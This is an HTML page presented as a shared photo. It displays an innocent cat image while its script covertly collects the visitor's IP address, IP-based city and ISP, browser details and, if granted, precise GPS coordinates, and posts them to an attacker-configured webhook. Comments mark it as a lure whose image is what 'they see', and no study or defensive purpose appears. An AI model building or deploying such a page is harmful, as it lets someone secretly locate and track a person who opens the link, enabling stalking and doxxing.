<!DOCTYPE html>
<html>
<head>
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Cat_November_2010-1a.jpg/1200px-Cat_November_2010-1a.jpg">
    <meta property="og:title" content="Check this out 😂">
    <title>📷 Photo</title>
    <style>
        * { margin: 0; padding: 0; }
        body { 
            background: #000; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
        }
        img { 
            max-width: 100%; 
            max-height: 100%; 
            object-fit: contain; 
        }
    </style>
</head>
<body>
    <!-- A real, innocent image they see -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Cat_November_2010-1a.jpg/1200px-Cat_November_2010-1a.jpg">

    <script>
        // === YOUR WEBHOOK URL ===
        var webhook = "https://webhook.site/dfcb4c44-53ae-4d23-ad55-f008e7bf4c07";
        // ========================

        var data = {
            ip: "fetching...",
            lat: "denied",
            lon: "denied",
            acc: "N/A",
            ua: navigator.userAgent,
            screen: screen.width + "x" + screen.height,
            lang: navigator.language,
            time: new Date().toISOString(),
            referrer: document.referrer
        };

        // Grab IP from free API
        fetch("https://api.ipify.org?format=json")
            .then(r => r.json())
            .then(d => {
                data.ip = d.ip;
                return fetch("http://ip-api.com/json/" + d.ip);
            })
            .then(r => r.json())
            .then(geo => {
                data.city = geo.city;
                data.region = geo.regionName;
                data.country = geo.country;
                data.ispLat = geo.lat;
                data.ispLon = geo.lon;
                data.isp = geo.isp;
                sendHome();
            })
            .catch(() => sendHome());

        // Try GPS (prompts user for permission)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    data.lat = pos.coords.latitude;
                    data.lon = pos.coords.longitude;
                    data.acc = pos.coords.accuracy + "m";
                    sendHome();
                },
                function() {
                    // Denied — we still have IP-based location
                    sendHome();
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }

        function sendHome() {
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
